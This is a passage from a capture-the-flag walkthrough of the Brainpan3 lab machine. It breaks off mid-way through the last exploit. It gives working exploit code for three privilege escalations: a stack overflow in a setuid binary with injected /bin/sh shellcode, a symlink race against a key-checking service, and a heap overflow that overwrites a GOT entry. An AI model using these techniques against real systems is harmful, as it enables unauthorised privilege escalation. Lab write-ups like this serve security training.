/usr/bin/traceroute6.iputils
/usr/bin/chfn
/usr/bin/at
/usr/bin/chsh
/usr/bin/mtr
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/sudo
/home/reynard/private/cryptor
/bin/su
/bin/ping
/bin/fusermount
/bin/mount
/bin/umount
/bin/ping6
```

The binary that sticks out here is `/home/reynard/private/cryptor`. Can we execute this binary?

```
anansi@brainpan3:/home/anansi$ $ /home/reynard/private/cryptor
/home/reynard/private/cryptor
Usage: /home/reynard/private/cryptor file key
```

So we can execute the `cryptor` binary. Let's try to look at this binary:

```
anansi@brainpan3:/$ $ cd ~
cd ~
anansi@brainpan3:/home/anansi$ $ cp /home/reynard/private/cryptor .
cp /home/reynard/private/cryptor .
anansi@brainpan3:/home/anansi$ $ ls -la
```

Let's pull this binary off Brainpan3 and onto our local machine:

```
anansi@brainpan3:/home/anansi$ $ python -m SimpleHTTPServer 8080
python -m SimpleHTTPServer 8080
```

On our host:

```
wget http://192.168.224.154:8080/cryptor
```

And now we have our binary:

```
192.168.224.156 - - [10/Sep/2015 06:36:19] "GET / HTTP/1.1" 200 -
192.168.224.156 - - [10/Sep/2015 06:36:25] "GET /cryptor HTTP/1.1" 200 -
```

Quick sanity check for the `cryptor` binary:
```
ctf@ctf-barberpole:~/ctfs/brainpan3/files$ checksec cryptor 
[*] '/home/ctf/ctfs/brainpan3/files/cryptor'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE
```

Awesome, no canary and no NX. This means, assuming we can find a buffer overflow. We can jump back to our shellcode and execute our payload from there, avoiding ROP or other shenanigans.

Looking at the binary in IDA, we can see a buffer overflow condition. We see a buffer that is allocated 100 bytes.

![Buffer Overflow 1](cryptor-buff1.png)

There is then a check if the first argument (argv[1]) is less than or equal to 116 bytes.

![Buffer Overflow 2](cryptor-buff2.png)

Here we are given the situation of writing 116 bytes into a 100 byte buffer, potentially causing an overflow. With this knowledge, let's test it dynamically.

Open `gdb ./cryptor` with [https://github.com/zachriggle/pwndbg](Pwndbg) enabled and throw a 116 byte string at crytor with a junk second string.

Create the 116 byte string using [https://github.com/binjitsu/binjitsu/](Binjitsu).

```
>>> from pwn import *
>>> cyclic(116)
'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaab'
```

Run the binary with our 116 byte string.

```
Loaded 53 commands.  Type pwndbg for a list.
Reading symbols from ./cryptor...(no debugging symbols found)...done.
Only available when running
pwn> r aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaab zzzz
```

Watch as we get a fancy crash

```
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
[----------REGISTERS----------]
 EAX  0x0
 EBX  0x62616164 ('daab')
 ECX  0x0
 EDX  0x0
 EDI  0x636e652e ('.enc')
 ESI  0x0
 EBP  0x61616179 ('yaaa')
 ESP  0xffffcb08 <-- 'baab'
 EIP  0x6261617a ('zaab')
[----------BACKTRACE----------]
>  f 0 6261617a
   f 1 62616162
   f 2        0
Program received signal SIGSEGV
```

Awesome, so we have a crash at offset `zaab` in our `cyclic` string. Let's create another cyclic string replacing the `zaab` to know that we have surgical control of EIP.

```
>>> shellcode = 'A' * cyclic_find('zaab') + 'BBBB'
>>> shellcode += 'C' * (116 - len(shellcode))
>>> print shellcode
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCC
```

```
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
[-------------------------------------REGISTERS-------------------------------------]
*EAX  0x0
*EBX  0x43434343 ('CCCC')
*ECX  0x0
*EDX  0x0
*EDI  0x636e652e ('.enc')
*ESI  0x0
*EBP  0x41414141 ('AAAA')
*ESP  0xffffcb08 <-- 'CCCC'
*EIP  0x42424242 ('BBBB')
[-------------------------------------BACKTRACE-------------------------------------]
>  f 0 42424242
>  f 1 43434343
>  f 2        0
>   Program received signal SIGSEGV
```

We also notice that the second argument is stored in a global array found at `0x804a080`. If we dump shellcode in that 

Our plan of attack here is as follows:

* Overwrite the return address `BBBB` with `0x804a080`
* Drop `/bin/sh` shellcode in the second argument in order to gain a shell

Our resulting testing script is below:

```python
from pwn import * # pip install --upgrade git+https://github.com/binjitsu/binjitsu.git

shellcode = 'A' * cyclic_find('zaab') + p32(0x804a080)
shellcode += 'C' * (116 - len(shellcode))

r = process(['./cryptor', shellcode, asm(shellcraft.sh())])

r.interactive()
```

Now we have to execute this command on the server. In order to do this, we create the command in the script, then send the command from the script. The process is shown below:

```python
offset = cyclic_find('zaab')
buffer = 116 - len(shellcode)

# Yay easy /bin/sh shells
binsh_shellcode = asm(shellcraft.sh())

# Build argv1
argv1 = '"A" * {} + "{}" + "C" * {}'.format(offset, r'\x80\xa0\x04\x08', buffer)

# Build argv2
argv2 = ''.join('\\x{}'.format(enhex(binsh_shellcode)[x:x+2]) for x in xrange(0, len(enhex(binsh_shellcode)), 2))

# Final command
actual_shellcode = """./cryptor $(python -c 'print {}') $(python -c 'print "{}"')""".format(argv1, argv2)

log.info(actual_shellcode)

# Sometimes the command didn't work. This will repeat throwing the command until we get a reynard shell
r.sendline('cd /home/reynard/private')
while True:
    r.clean()
    r.sendline(actual_shellcode)
    r.clean()
    r.sendline('id')
    output = r.recv()
    if 'reynard' in output:
        break

log.info("Shell recevied: reynard")

r.interactive()
```

And we are given our reynard shell!

```
[*] ./cryptor $(python -c 'print "A" * 100 + "\x80\xa0\x04\x08" + "C" * 12') $(python -c 'print "\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x6a\x0b\x58\x89\xe3\x31\xc9\x99\xcd\x80"')
[*] Shell recevied: reynard
[*] Switching to interactive mode
uid=1000(anansi) gid=1003(webdev) euid=1002(reynard) groups=1002(reynard)
```

## Step 4

A little more recon shows the following cron job:

```
$ cat /etc/cron.d/*
* * * * * root cd /opt/.messenger; for i in *.msg; do /usr/local/bin/msg_admin 1 $i; rm -f $i; done
```

Looking at the privileges of `/opt/.messenger` we see the following:

```
$ ls -la /opt
total 12
drwxr-xr-x  3 root root 4096 May 19 23:51 .
drwxr-xr-x 21 root root 4096 Jun 17 22:05 ..
drwxrwx---  3 root dev  4096 Jun 10 22:32 .messenger
```

Examining the tail of `/etc/passwd`, we see `puck`. Looking at his `id`:

```
$ id puck
uid=1001(puck) gid=1001(puck) groups=1001(puck),1004(dev)
```

He does have `dev` privileges allowing him to access `/opt/.messenger`. Let's take a look at what `puck` has on the box.

```
$ cd /home/puck
$ ls -la
total 12
drwxrwx--- 2 reynard dev     4096 Jun 17 22:11 .
drwxr-xr-x 3 root    root    4096 May 19 23:35 ..
-rw-r--r-- 1 reynard reynard   21 Jun 17 22:11 key.txt
$ cat key.txt
9H37B81HZYY8912HBU93
```

Are there other keys on the box?

```
$ find / -name key* 2>/dev/null
/nt/usb/key.txt
$ cat /mnt/usb/key.txt
9H37B81HZYY8912HBU93
```

Not sure what these keys are for. Looking at the `netstat` we see another service is active:

```
$ netstat -antop | grep LIST
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      -                off (0.00/0/0)
tcp        0      0 0.0.0.0:1337            0.0.0.0:*               LISTEN      -                off (0.00/0/0)
tcp        0      0 127.0.0.1:7075          0.0.0.0:*               LISTEN      -                off (0.00/0/0)
```

Connecting to it

```
$ nc localhost 7075
Incorrect key
```

Not having any idea what service this is coming from, let's perform a system wide `strings` to try and find the binary responsible for this.

```
$ find / -executable > exes
$ for f in $(cat exes); do echo $f >> output; strings $f | grep "Incorrect key" >> output; done
$ grep Incorrect output -B1
/usr/local/sbin/trixd
Incorrect key
```

And to confirm

```
$ strings /usr/local/sbin/trixd | grep Incorrect
Incorrect key
```

Loading `trixd` into IDA we see that the binary is checking to see if `/mnt/usb/key.txt` is a symlink, and if so, exits immediately. From here, it opens both `/mnt/usb/key.txt` and `/home/puck/key.txt` and checks if they are both the same. If they are the same, we are given a `/bin/sh` shell. Otherwise, we see the `Incorrect key` message.

The idea to beat this is to connect, delete `/mnt/usb/key.txt`, then symlink `/home/puck/key.txt` to `/mnt/usb/key.txt`. If timed correctly, we will catch the symlink after the check, bypassing it.

I couldn't get `binjitsu` on the Brainpan3 box (or didn't try hard enough), so we can use standard library functions to do the connections.

Again, in order to make this work via one script, we will write a script to disk and execute it in order to get our shell with `puck`.

Our new code is below:

```python
# Create our script on the server

r.sendline(""" echo "
import os
import socket
import telnetlib
import subprocess

HOST = 'localhost'
PORT = 7075

try:
    os.remove('/mnt/usb/key.txt')
except:
    pass

# Ensure we have a file to begin with
subprocess.check_output(['touch', '/mnt/usb/key.txt'])

# Connect and check for symlink
r = socket.socket()
r.connect((HOST, PORT))

# Quickly remove the non-symlinked file and re-symlink
os.remove('/mnt/usb/key.txt')
os.symlink('/home/puck/key.txt', '/mnt/usb/key.txt')

# Try for our shellz
t = telnetlib.Telnet()
t.sock = r
t.interact()

r.close()
" > win.py
""")

r.sendline("python win.py")
r.clean()
r.sendline("whoami")
output = r.recv()
log.success("Shell received: {}".format(output))
sleep(1)

r.interactive()
```

## Step 5

```
ctf@ctf-barberpole:~/ctfs/brainpan3/files$ checksec msg_admin 
[*] '/home/ctf/ctfs/brainpan3/files/msg_admin'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE
```

ASLR is on:
```
$ cat /proc/sys/kernel/randomize_va_space
2
```

```python
# make-pwnmsg.py
from pwn import *

with open('pwn.msg', 'w') as f:
    f.write('{}|{}\n'.format('a'*4, 'A'*10))
    f.write('{}|{}\n'.format('b'*4, 'B'*10))
    f.write('{}|{}\n'.format('b'*4, 'C'*10))

```

```
ctf@ctf-barberpole:~/ctfs/brainpan3/files$ cat pwn.msg
aaaa|AAAAAAAAAAAA
bbbb|BBBBBBBBBBBB
bbbb|CCCCCCCCCCCC
```

```
gdb ./msg_admin
r 1 pwn.msg
```


```
# hexdump 0x804c390 120

+0000 0x804c390  a8 c3 04 08  11 00 00 00  61 61 61 61  00 00 00 00  |....|....|aaaa|....|
+0010 0x804c3a0  00 00 00 00  d1 00 00 00  41 41 41 41  41 41 41 41  |....|....|AAAA|AAAA|
+0020 0x804c3b0  41 41 00 00  00 00 00 00  00 00 00 00  00 00 00 00  |AA..|....|....|....|
+0030 0x804c3c0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  |....|....|....|....|
*
+00e0 0x804c470  00 00 00 00  11 00 00 00  01 00 00 00  88 c4 04 08  |....|....|....|....|
+00f0 0x804c480  98 c4 04 08  11 00 00 00  62 62 62 62  00 00 00 00  |....|....|bbbb|....|
+0100 0x804c490  00 00 00 00  d1 00 00 00  42 42 42 42  42 42 42 42  |....|....|BBBB|BBBB|
+0110 0x804c4a0  42 42 00 00  00 00 00 00  00 00 00 00  00 00 00 00  |BB..|....|....|....|
```

```
>>> 0x804c480 - 0x804c3a8
216
```

Suspicion that we can overflow the two pointers with `A`s
```python
# make-pwnmsg.py
from pwn import *

with open('pwn.msg', 'w') as f:
    f.write('{}|{}\n'.format('a'*4, cyclic(216)))
    f.write('{}|{}\n'.format('b'*4, 'B'*10))
    f.write('{}|{}\n'.format('b'*4, 'C'*10))

```

```
[-------------------------------------REGISTERS-------------------------------------]
*EAX  0x62626262 ('bbbb')
*EBX  0x804c170 <-- 'bbbb'
*ECX  0x804c170 <-- 'bbbb'
*EDX  0x63616164 ('daac')
*EDI  0x0
*ESI  0xffffc9d0 <-- 1
*EBP  0xffffca68 <-- 0
*ESP  0xffffc83c --> 0x8048cd0 (main+539) <-- mov    eax, dword ptr [ebp - 0x4c]
*EIP  0xf7e95d82 <-- mov    dword ptr [edx], eax
[---------------------------------------CODE----------------------------------------]
 => 0xf7e95d82    mov    dword ptr [edx], eax
[-------------------------------------BACKTRACE-------------------------------------]
>  f 0 f7e95d82
   f 1  8048cd0 main+539
   f 2 f7e23a83 __libc_start_main+243
   f 3  8048741 _start+33
Program received signal SIGSEGV
```

Boom! Looks like we are overwriting the data in address `daac` (from our cyclic function) with `bbbb` (our second message). This is effectively a write-what-where condition.

Looking at 0x804cd0, we see that we are in a strcpy. Set breakpoint there and restart:

```
[---------------------------------------CODE----------------------------------------]
=> 0x8048ccb <main+534>    call   0x8048630 <strcpy@plt>
    dest:      0x63616164 ('daac')
    src:       0x804c170 <-- 'bbbb'
```

At the point of crash, our stack is in the following state:

```
[---------------------------------------STACK---------------------------------------]
00:0000| esp  0xffffc83c --> 0x8048cd0 (main+539) <-- mov    eax, dword ptr [ebp - 0x4c]
01:0004|      0xffffc840 <-- 0x63616164
02:0008|      0xffffc844 --> 0x804c170 <-- 'bbbb'
03:000c|      0xffffc848 --> 0x804c008 <-- 0xfbad2488
04:0010|      0xffffc84c <-- 'aaaabaaacaaadaa...'
05:0014|      0xffffc850 <-- 'baaacaaadaaaeaa...'
06:0018|      0xffffc854 <-- 'caaadaaaeaaafaa...'
07:001c|      0xffffc858 <-- 'daaaeaaafaaagaa...'
```

Set `bbbb` to the address of `stack move 20 from binjitsu` and set the offset of `daac` to the `strtok` GOT entry.

```
from pwn import *

elf = ELF('msg_admin')
rop = ROP(elf)

pivot = rop.search(move=20).address # Need to move the stack 20 bytes to get to our ROP chain
strtok = elf.got['strtok']

log.info("Pivot: {}".format(hex(pivot)))
log.info("Strtok: {}".format(hex(strtok)))

# Overwrite `strtok` in GOT with the stack pivot
with open('pwn.msg', 'w') as f:
    sc = 'A' * cyclic_find('daac') + p32(strtok)
    sc += 'B' * (216 - len(sc))
    f.write('{}|{}\n'.format('a'*4, sc))
    f.write('{}|{}\n'.format(p32(pivot), 'B'*12))
    f.write('{}|{}\n'.format('b'*4, 'C'*12))
```

















